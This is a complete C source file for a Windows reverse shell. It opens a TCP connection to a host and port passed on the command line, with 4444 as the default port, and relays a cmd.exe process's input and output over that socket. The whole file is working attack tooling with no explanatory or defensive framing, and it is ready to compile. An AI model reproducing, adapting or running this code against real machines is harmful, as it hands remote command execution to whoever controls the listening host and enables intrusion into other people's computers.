#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "Ws2_32.lib")

#define BUFSIZE 8192

static SOCKET sock = INVALID_SOCKET;

static int connect_back(const char *host, const char *port) {
    WSADATA wsa;
    struct addrinfo hints, *res = NULL;
    SOCKET s = INVALID_SOCKET;
    int r;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return -1;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(host, port, &hints, &res) != 0) {
        WSACleanup();
        return -1;
    }

    s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (s == INVALID_SOCKET) {
        freeaddrinfo(res);
        WSACleanup();
        return -1;
    }

    r = connect(s, res->ai_addr, (int)res->ai_addrlen);
    freeaddrinfo(res);

    if (r == SOCKET_ERROR) {
        closesocket(s);
        WSACleanup();
        return -1;
    }

    sock = s;
    return 0;
}

static void run_shell(void) {
    HANDLE in_r, in_w, out_r, out_w;
    SECURITY_ATTRIBUTES sa;
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    char cmdbuf[BUFSIZE];
    int n, offset, r;
    DWORD written;

    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    CreatePipe(&in_r, &in_w, &sa, 0);
    CreatePipe(&out_r, &out_w, &sa, 0);

    SetHandleInformation(in_r, HANDLE_FLAG_INHERIT, 0);

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = in_r;
    si.hStdOutput = out_w;
    si.hStdError = out_w;

    memset(&pi, 0, sizeof(pi));

    if (!CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        closesocket(sock);
        WSACleanup();
        return;
    }

    CloseHandle(in_r);
    CloseHandle(out_w);

    while (1) {
        char buf[BUFSIZE + 1];
        DWORD avail = 0, read = 0;

        if (!PeekNamedPipe(out_r, NULL, 0, NULL, &avail, NULL))
            break;
        if (avail > 0) {
            if (!ReadFile(out_r, buf, BUFSIZE, &read, NULL) || read == 0)
                break;
            offset = 0;
            while (offset < (int)read) {
                r = send(sock, buf + offset, read - offset, 0);
                if (r == SOCKET_ERROR || r == 0)
                    goto done;
                offset += r;
            }
        }

        n = recv(sock, cmdbuf, BUFSIZE, 0);
        if (n == 0)
            break;
        if (n == SOCKET_ERROR) {
            if (WSAGetLastError() == WSAEWOULDBLOCK)
                n = 0;
            else
                break;
        }

        if (n > 0) {
            offset = 0;
            while (offset < n) {
                if (!WriteFile(in_w, cmdbuf + offset, n - offset, &written, NULL))
                    goto done;
                offset += written;
            }
            offset = 0;
            while (offset < n) {
                r = send(sock, cmdbuf + offset, n - offset, 0);
                if (r == SOCKET_ERROR || r == 0)
                    goto done;
                offset += r;
            }
        }
    }

done:
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(in_w);
    CloseHandle(out_r);
}

int main(int argc, char **argv) {
    const char *host;
    const char *port;

    if (argc >= 3) {
        host = argv[1];
        port = argv[2];
    } else if (argc == 2) {
        host = argv[1];
        port = "4444";
    } else {
        printf("usage: %s <host> [port]\n", argv[0]);
        return 1;
    }

    if (connect_back(host, port) != 0) {
        fprintf(stderr, "[!] failed to connect to %s:%s\n", host, port);
        return 1;
    }

    fprintf(stderr, "[+] connected to %s:%s\n", host, port);
    run_shell();

    closesocket(sock);
    WSACleanup();
    return 0;
}
